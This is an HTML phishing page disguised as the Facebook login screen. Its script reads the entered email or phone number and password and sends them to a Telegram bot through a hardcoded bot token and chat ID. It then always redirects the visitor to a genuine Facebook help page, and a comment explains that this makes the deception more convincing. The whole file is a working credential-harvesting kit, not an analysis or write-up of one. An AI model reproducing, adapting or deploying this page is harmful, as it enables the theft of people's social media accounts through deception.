<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Login And Sign up</title>
    <style>
        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 110vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .login-container {
            background-color: auto;
            //padding: 20px 20px 24px;
            border-radius: 8px;
            \\box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 396px;
            box-sizing: border-box;
            text-align: center;
            margin-bottom: 30px;
        }

        .custom-logo {
            width: 80px;
            height: 80px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png') no-repeat center;
            background-size: contain;
            margin: 0 auto 10px;
        }

        .app-name {
            color: #1877F2;
            font-weight: bold;
            font-size: 38px;
            font-weight: 600;
            margin: 0 0 20px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #ababab;
            border-radius: 100px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .login-form input[type="text"]:focus,
        .login-form input[type="password"]:focus {
            border-color: black;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        #error-message {
            color: red;
            font-size: 14px;
            margin-top: -5px; 
            margin-bottom: 10px; 
            display: none; 
        }

        /* Shared styles for link "buttons" */
        .button-link {
            display: inline-block;
            text-decoration: none;
            color: #fff;
            border: none;
            border-radius: 100px;
            font-weight: //bold;
            padding: 12px 16px;
            cursor: pointer;
            text-align: center;
            box-sizing: border-box;
        }

        .login-button-link { 
            background-color: #1877f2;
            font-size: 20px;
            width: 100%; 
            margin-bottom: 16px;
            line-height: 24px;
        }

        .login-button-link:hover {
            background-color: #166fe5;
        }

        .forgot-password-link {
            color: #1877f2;
            font-size: 15px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }

        .forgot-password-link:hover {
            text-decoration: //underline;
        }

        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-account-link { 
            background-color: #42b72a;
            font-size: 17px;
            width: 340px;
            min-width: 194px;
            line-height: 22px;
        }

        .create-account-link:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="custom-logo" aria-label="SocialVillage Logo"></div>
        <h2 class="app-name">facebook</h2>
        <form id="loginForm" class="login-form">
            <input type="text" id="username" name="username" placeholder="Email address or phone number" required autocomplete="username">
            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
            
            <p id="error-message">Please enter both email and password.</p>

            <!-- --- MODIFIED: The href now points to the real Facebook site --- -->
            <a href="https://www.facebook.com" id="loginLink" class="button-link login-button-link">Log In</a>
            
            <a href="https://www.facebook.com/hacked" class="forgot-password-link">Forgotten password?</a>
            
            <hr class="divider">
            
            <a href="mailto:iamumair@duck.com" class="button-link create-account-link" "return false;">Create New Account</a>
            <br>
            <br>
            <small>Log in to your account to stay connected and share with people in your network.
             <br><br><br><br><br>
             Facebook © 2025
            </small>
        </form>
    </div>

    <script>
      // --- TELEGRAM BOT INTEGRATION ---
      const botToken = '8158917342:AAH4Sh6LgPpaB7H1XJSpAj3ailte6eM7Gj4'; 
      const chatId = '8000573572'; 

      const loginLink = document.getElementById('loginLink');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const errorMessage = document.getElementById('error-message');

      if (loginLink) {
        loginLink.addEventListener('click', function(event) {
          event.preventDefault(); // IMPORTANT: This prevents the link from redirecting immediately, giving our script time to run.

          const username = usernameInput.value.trim();
          const password = passwordInput.value.trim();

          if (!username || !password) {
            errorMessage.style.display = 'block';
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 2000);
            return;
          }

          const message = `•New Login On Facebook.
          \n- Username : ${username}\n- Password : ${password}`;

          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          // --- MODIFIED: The logic inside fetch is updated ---
          fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown'
            })
          })
          .finally(() => {
            // This 'finally' block runs whether the fetch succeeded or failed.
            // This ensures the user is ALWAYS redirected, making the page behavior more convincing.
            window.location.href = 'https://m.facebook.com/help/contact/295309487309948?wtsid=rdr_02aOja5qsG6WuXy5k';
          });
          // --- END OF MODIFICATION ---
        });
      }
    </script>
</body>
</html>
